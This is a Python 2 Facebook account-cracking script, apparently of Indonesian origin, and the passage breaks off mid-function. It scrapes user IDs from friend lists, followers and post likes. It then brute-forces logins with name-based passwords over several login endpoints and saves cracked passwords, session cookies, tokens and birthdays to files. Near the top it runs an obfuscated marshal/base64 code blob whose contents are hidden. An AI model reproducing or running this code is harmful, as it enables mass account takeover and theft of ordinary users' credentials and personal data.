#!/usr/bin/python2
# coding=utf-8
# coding by Romi Afrizal & Ari Ariandi XD.
# Note : jangan di ubah lagi! nanti error, script udah enak
# Open source code team | ngotak dikit cok jangan jual di perjual belikan 
#Thanks To Romi Afrizal
#Sungkem Bang, Jangan Buly Gw Klw Boleh Bantu Suport Nya, Hhe:)
Hj = '\x1b[1;92m' 
Mt = '\x1b[0m' 
ingfo = (
"""%s
 • Info script :-
 	
 
%s"""%(Hj,Mt))

import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')
    
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime

_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', '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', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()

user, mi, status_foll, cr, ok, cp, id, user, loop, looping = [], [], [], [], [], [], [], [], 0, 1

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush();jeda(0.03)
        
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s Plase Wait %s'%(M,til,o)),
        sys.stdout.flush();jeda(1)
        
def folder():
	try:os.mkdir('hasil')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:
		ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
		open("data/ua.txt","w").write(ua_)
	except:
		pass
# LOGO (LO GOBLOK)
IP = requests.get("https://api.ipify.org/").text
def banner():
	print ("""%s 
 
   __  __      __  _______  ______
  / / / /     /  |/  / __ )/ ____/
 / / / /_____/ /|_/ / __  / /_    
/ /_/ /_____/ /  / / /_/ / __/    
\____/     /_/  /_/_____/_/       

                                  """%(M))

                                  
# MASUK TOKEN (TOKEN LISTRIK)
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');banner()
    print ('\n%s 1 • Login via token \n 2 • Cara mendapatkan token \n %s0%s • Keluar'%(O,M,U))
    rom = raw_input('\n%s • Menu : %s'%(O,H))
    if rom in(""):
    	print("%s • Isi yang benar kentod "%(M));jeda(2);masuk()
    elif rom in ('1','01'):
        jalan("\n%s %s•%s Wajib pakai akun tumbal tod!! "%(O,M,U))
    	romz = raw_input('%s • Masukin token lu : %s'%(O,H))
        if romz in(""):
        	print("%s • Isi yang benar kentod "%(M));jeda(2);masuk()
    	try:
            gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
            print ('\n%s • Login berhasil!!, selamat datang dan selamat menggunakan:) '%(H));jeda(2)
            open('token.txt', 'w').write(romz);login_bot(romz)
            exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
        except (KeyError,IOError):
        	print("%s • Token invalid ngab!! "%(M));jeda(2);masuk()
    elif rom in ('2', '02'):
    	print ("\n%s%s Berikut cara nya :"%(H,til));jeda(2)
        print (" • siapkan akun facebook (wajib akun tumbal)");jeda(2)
        print (" • loginkan akun facebook (tumbal) di browser %sChrome %s"%(O,H));jeda(2)
        print (" • url alamat wajib %shttps://m.facebook.com %s(mode data)"%(O,H));jeda(2)
        print (" • salin link : %sview-source:https://business.facebook.com/business_locations"%(O));jeda(2)
        print ("%s • taruh link tersebut di url alamat facebook lalu klik cari "%(H));jeda(2)
        print (" • jika sudah, klik %stitik tiga %spojok kanan atas "%(O,H));jeda(2)
        print (" • kemudian klik %sCari di Halaman %s"%(O,H));jeda(2)
        print (" • ketik %sEAAG %sakan muncul acces token."%(O,H));jeda(2)
        print (" • jika sudah jangan lupa di salin \n");jeda(2)
        nanya = raw_input('%s [?] Anda paham? [%sy%s/%sn%s] :%s '%(P,H,P,M,P,K))
        if nanya in(""):
        	print ("%s • saya bertanya anda wajib jawab!! "%(O));jeda(2);masuk()
        elif nanya in("y","Y"):
        	print ("\n%s [√] selamat anda jenius :* "%(H));jeda(2);masuk()
        elif nanya in("n","N"):
        	print ("\n%s • anda sungguh tolol dan ngentod:v "%(M));jeda(2);os.system("xdg-open https://youtu.be/IG5QfdxRkeY");masuk()
    elif rom in ('0', '00'):
    	exit('\n')
    else:
    	print("%s • Isi yang benar kentod!! "%(M));exit()
    
    
    
# DUMP PUBLIK
def publik(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s %s•%s Ketik '%saink%s' jika ingin dump id daftar teman lu "%(U,M,U,O,U))
        idt = raw_input(' • Masukan id target : %s'%(O))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=name,friends.fields(id,name).limit(5000)&access_token=%s'%(idt,romz))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s • mengambil id =%s %s ' % (U,M,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s%s•%s Berhasil dump id dari :%s%s'%(O,H,O,M,nm['name']))
        print ('%s %s•%s Copy hasil dump 👉 :%s %s '%(U,M,U,O,file))
        raw_input('\n%s [ %skembali %s] '%(U,O,U))
        menu()
    except Exception as e:
        exit('\n %s• gagal dump id akun tidak publik!! \n %s• Ketik Ulang python2 U-MBF.py '%(O,M))
        menu()
          
# DUMP FOLLOWERS
def followers(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s %s•%s Ketik '%saink%s' jika ingin dump id followers lu "%(U,M,U,O,U))
        idt = raw_input(' • Masukan id target : %s'%(M))
        batas = raw_input(' %s• Maximal id : %s'%(U,O))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=name,subscribers.fields(id,name).limit(%s)&access_token=%s'%(idt,batas,romz))
        z = json.loads(r.text)
        for a in z['subscribers']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s • mengambil id =%s %s ' % (U,M,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s%s•%s Berhasil dump id dari :%s%s'%(O,M,O,M,nm['name']))
        print (' %s%s•%s Copy hasil dump 👉 :%s %s '%(O,M,O,M,file))
        raw_input('\n%s [ %skembali %s] '%(U,M,U))
        menu()
    except Exception as e:
        exit('\n %s• gagal dump id akun tidak publik!! \n %s• Ketik Ulang python2 U-MBF.py '%(O,M))
        menu()
        
# DUMP POSTINGAN 
def postingan(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s %s•%s Ingat! postingan wajib bersifat publik "%(O,M,O))
        idt = raw_input(' • Id post target  : %s'%(M))
        simpan = raw_input(' %s• Nama file : %s'%(U,O,))
        r = requests.get('https://graph.facebook.com/%s?fields=name,likes.fields(id,name).limit(999999)&access_token=%s'%(idt,romz))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        bff = open(file, 'w')
        for a in z['likes']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s • mengambil id =%s %s ' % (U,M,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s%s•%s Berhasil dump id postingan :'%(O,H,O))
        print ('%s %s•%s Copy hasil dump 👉 :%s %s '%(U,M,U,M,file))
        raw_input('\n%s [ %skembali %s] '%(U,O,U))
        menu()
    except Exception as e:
        exit('\n %s• gagal dump id post tidak publik!! \n %s• Ketik Ulang python2 U-MBF.py '%(O,M))
        
# START CRACK
class ngentod:

    def __init__(self):
        self.id = []
    def romiy(self):
        try:
            self.apk = raw_input('\n %s• Masukin file hasil dump tadi tod :%s '%(M,O))
            self.id = open(self.apk).read().splitlines()
            print '%s %s•%s total id hasil dump = %s%s' %(O,M,U,M,len(self.id))
        except:
            print '\n%s • File dump tidak!! ada, dump id dulu kentod pilih nomer 1'%(M)
            raw_input('\n%s [ %skembali %s] '%(U,O,U));menu()
        unikers = raw_input('%s • lu mau pake password manual? [y/t] :%s '%(O,U))
        if unikers in ('Y', 'y'):
            print '\n %s%s•%s contoh : %ssayang,anjing,bangsat,monyet,rahasia%s gunakan , (koma) untuk pemisah tod '%(P,M,P,H,P)
            while True:
                pwx = raw_input(' %s • set password :%s '%(B,O))
                if pwx == '':
                    print '\n %s • jangan kosong kentod!! '%(M)
                elif len(pwx)<=5:
                    print '\n %s • password minimal 6 karakter!!'%(M)
                else:
                    def zona(zafi_=None): 
                        ind = raw_input('\n %s• methode? : %s'%(M,O))
                        if ind == '':
                            print("%s • Isi yang benar kentod!! "%(M));self.zona()
                        elif ind in ('1', '01'):
                            print '\n %s%s•%s akun %sOK%s di simpan di >%s hasil/OK-%s-%s-%s.txt'%(M,K,U,H,U,H,ha, op, ta);jeda(0.2)
                            print '%s %s•%s akun %sCP %sdi simpan di > %shasil/CP-%s-%s-%s.txt'%(M,K,O,K,O,U,ha, op, ta);jeda(0.2)
                            print '%s %s•%s setiap 4 menit crack hidup matikan mode peswat 2 detik!!\n'%(O,M,M);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('2', '02'):
                            print '\n%s %s•%s hasil %sOK%s di simpan ke >%s hasil/OK-%s-%s-%s.txt'%(M,K,U,H,U,H,ha, op, ta);jeda(0.2)
                            print '%s %s•%s hasil %sCP %sdi simpan ke > %shasil/CP-%s-%s-%s.txt'%(M,K,O,K,O,U,ha, op, ta);jeda(0.2)
                            print '%s %s•%s setiap 4 menit crack hidup matikan mode peswat 2 detik!!\n'%(O,M,M);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.basic, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('3', '03'):
                            print '\n %s%s•%s hasil %sOK%s di simpan ke >%s hasil/OK-%s-%s-%s.txt'%(M,K,U,H,U,H,ha, op, ta);jeda(0.2)
                            print '%s %s•%s hasil %sCP %sdi simpan ke > %shasil/CP-%s-%s-%s.txt'%(M,K,O,K,O,U,ha, op, ta);jeda(0.2)
                            print '%s %s•%s setiap 4 menit crack hidup matikan mode peswat 2 detik!!\n'%(O,M,M);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.mobil, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        else:
                            print ('\n %s• isi yang benar kentod!!'%(M));zona()
                    print '\n%s [ silahkan pilih methode crack ]\n'%(O)
                    print ' %s1%s • methode b-api  | %sfast crack'%(O,U,M)
                    print ' %s2%s • methode mbasic | %sslow crack'%(O,U,K)
                    print ' %s3%s • methode mobile | %srekomendasi '%(O,U,H)
                    zona(pwx.split(','))
                    break
        elif unikers in ('T', 't'):
            print '\n%s [ silahkan pilih methode crack ]\n'%(O)
            print ' %s1%s • methode b-api  | %sfast crack'%(O,U,M)
            print ' %s2%s • methode mbasic | %sslow crack'%(O,U,K)
            print ' %s3%s • methode mobile | %srekomendasi '%(O,U,H)
            self.langsung()
        else:
            print("%s • Isi yang benar kentod!! "%(M));jeda(2);menu()
    def langsung(self):
        suuu = raw_input('\n %s  • methode :%s '%(U,K))
        if suuu == '':
            print("%s • Isi yang benar kentod!! "%(M));self.langsung()
        elif suuu in ('1', '01'):
            print '\n %s%s•%s hasil %sOK%s di simpan ke >%s hasil/OK-%s-%s-%s.txt'%(M,K,U,H,U,H,ha, op, ta);jeda(0.2)
            print '%s %s•%s hasil %sCP %sdi simpan ke > %shasil/CP-%s-%s-%s.txt'%(M,K,O,K,O,U,ha, op, ta);jeda(0.2)
            print '%s %s•%s setiap 4 menit crack hidup matikan mode peswat 2 detik!!\n'%(O,M,M);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.b_api, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ('2', '02'):
            print '\n%s %s•%s hasil %sOK%s di simpan ke >%s hasil/OK-%s-%s-%s.txt'%(M,U,U,H,U,H,ha, op, ta);jeda(0.2)
            print '%s %s•%s hasil %sCP %sdi simpan ke > %shasil/CP-%s-%s-%s.txt'%(M,U,O,K,O,U,ha, op, ta);jeda(0.2)
            print '%s %s•%s setiap 4 menit crack hidup matikan mode peswat 2 detik!!\n'%(O,M,M);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.basic, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ('3', '03'):
            print '\n %s%s•%s hasil %sOK%s di simpan ke >%s hasil/OK-%s-%s-%s.txt'%(M,U,U,H,U,H,ha, op, ta);jeda(0.2)
            print '%s %s•%s hasil %sCP %sdi simpan ke > %shasil/CP-%s-%s-%s.txt'%(M,U,O,K,O,U,ha, op, ta);jeda(0.2)
            print '%s %s•%s setiap 4 menit crack hidup matikan mode peswat 2 detik!!\n'%(O,M,M);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.mobil, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        else:
            print("\n%s • Isi yang benar kentod!! "%(M));self.langsung()
            
    def b_api(self, user, zona):
    	try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'                 
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            header = {"user-agent": ua,
            "x-fb-connection-bandwidth": str(random.randint(20000,40000)),
            "x-fb-sim-hni": str(random.randint(20000,40000)),
            "x-fb-net-hni": str(random.randint(20000,40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger"}
            bapi = "https://b-api.facebook.com/method/auth.login"
            response = ses.get(bapi+'?format=json&email='+user+'&password='+pw+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
            	loop +=1
            	print ("\r\033[0;91m [!] Spam IP, hidup matikan mode pesawat 2 detik tod"),
                sys.stdout.flush()
                b_api(self, user, zona)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %s*--> %s | %s | %s ' % (H,user,pw,response.json()['access_token'])
                ok.append('%s | %s | %s' % (user,pw,response.json()['access_token']))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s | %s | %s\n'%(user,pw,response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s*--> %s | %s | %s %s %s  ' % (K,user,pw,day,month,year)
                    cp.append("%s | %s | %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s | %s | %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s*--> %s | %s           ' % (K,user,pw)
                cp.append('%s | %s' % (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s | %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        for ari_kontol in list('\|-/'):
        	print('\r [%s%s%s] [ %s/%s ] [OK-:%s]<>[CP-:%s]'%(K,ari_kontol,O,loop,len(self.id),len(ok),len(cp))),
        	sys.stdout.flush()
    def basic(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s*--> %s | %s | %s  ' % (H,user,pw,kuki)
                ok.append("%s | %s | %s"% (user,pw,kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s | %s | %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s*--> %s | %s | %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s | %s | %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s | %s | %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s*--> %s | %s            ' % (K,user,pw)
                cp.append("%s | %s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s | %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        for ari_kontol in list('\|-/'):
        	print('\r [%s%s%s] [ %s/%s ] [OK-:%s]<>[CP-:%s]'%(K,ari_kontol,O,loop,len(self.id),len(ok),len(cp))),
        	sys.stdout.flush()
        
    def mobil(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fdevelopers.facebook.com%2F&lwv=100&refid=8', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s*--> %s | %s | %s ' % (H,user,pw,kuki)
                ok.append("%s | %s | %s"% (user,pw,kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s | %s | %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s*--> %s | %s | %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s | %s | %s %s %s"% (user,pw,day,month,year))
